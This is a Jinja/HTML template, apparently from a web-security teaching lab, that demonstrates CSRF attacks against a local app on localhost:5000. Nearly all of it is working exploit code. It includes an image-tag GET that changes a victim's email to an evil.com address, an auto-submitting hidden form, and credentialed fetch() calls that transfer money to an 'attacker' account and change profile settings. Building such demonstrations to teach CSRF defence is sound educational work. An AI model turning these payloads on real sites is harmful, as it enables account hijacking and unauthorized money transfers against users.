{% extends "base.html" %}

{% block content %}
<h1>Демонстрация CSRF эксплойтов</h1>

<div class="alert">
    <strong>Внимание!</strong> Эти эксплойты работают только если вы вошли в систему.
    Откройте эту страницу в новой вкладке после входа.
</div>

<h2>Простой GET эксплойт</h2>
<pre><code>&lt;img src="http://localhost:5000/update-profile?email=hacked@evil.com"&gt;</code></pre>
<button onclick="runGetExploit()">Запустить GET эксплойт</button>

<h2>POST эксплойт - перевод денег</h2>
<pre><code>
&lt;form id="transferForm" action="http://localhost:5000/transfer" method="POST"&gt;
    &lt;input type="hidden" name="amount" value="50"&gt;
    &lt;input type="hidden" name="target_user" value="attacker"&gt;
    &lt;input type="hidden" name="comment" value="CSRF Attack"&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById('transferForm').submit();&lt;/script&gt;
</code></pre>
<button onclick="runPostExploit()">Запустить POST эксплойт</button>

<h2>Комбинированная атака</h2>
<button onclick="runCombinedAttack()">Запустить полную атаку</button>

<script>
function runGetExploit() {
    const img = new Image();
    img.src = "http://localhost:5000/update-profile?email=student" + Date.now() + "@hacked.com";
    alert("GET эксплойт выполнен! Проверьте email в профиле.");
}

function runPostExploit() {
    fetch('http://localhost:5000/transfer', {
        method: 'POST',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'amount=50&target_user=attacker&comment=CSRF+Attack'
    }).then(() => alert("POST эксплойт выполнен! Проверьте баланс."));
}

function runCombinedAttack() {
    // Смена email
    fetch('http://localhost:5000/update-profile', {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'email=fully+hacked@evil.com&phone=1234567890'
    });
    
    // Смена статуса
    fetch('http://localhost:5000/update-preferences', {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'status=premium'
    });
    
    // Перевод денег
    fetch('http://localhost:5000/transfer', {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'amount=70&target_user=attacker&comment=Full+CSRF+Attack'
    });
    
    alert("Комбинированная атака выполнена! Проверьте профиль.");
}
</script>
{% endblock %}
